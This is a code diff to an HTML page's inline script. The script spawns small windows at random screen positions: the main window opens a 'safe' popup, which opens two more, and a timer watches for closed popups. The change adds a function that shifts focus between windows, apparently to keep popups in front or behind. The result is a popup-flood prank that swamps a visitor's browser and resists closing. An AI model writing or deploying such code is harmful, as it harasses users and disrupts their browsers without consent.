@@ -12,9 +12,16 @@
     <script>
         window.plsclose = 'no'
         window.clone = new URLSearchParams(window.location.search).get('popup') || 'main'
-        function openNew(input = 'popup') {
+        
+        function Bounce(w) {
+            window.blur()
+            w.focus()
+        }
+        
+        function openNew(input) {
             var popup = window.open(window.location.href + '?popup=' + input, '', 'top=' + Math.floor(Math.random() * screen.availHeight) + ',left=' + Math.floor(Math.random() * screen.availWidth) + ',width=350,height=250');
-            if(input === 'safe') { popup.blur(); }
+            
+            if(input === 'safe') { popup.Bounce(window) }
             var popupTick = setInterval(function () {
                 if (popup.closed) {
                     clearInterval(popupTick);
@@ -30,8 +37,8 @@
         if (window.clone === 'main') {
             openNew('safe')
         } else if (window.clone === 'safe') {
-            openNew()
-            openNew()
+            openNew('popup')
+            openNew('popup')
         }
     </script>
     <style>
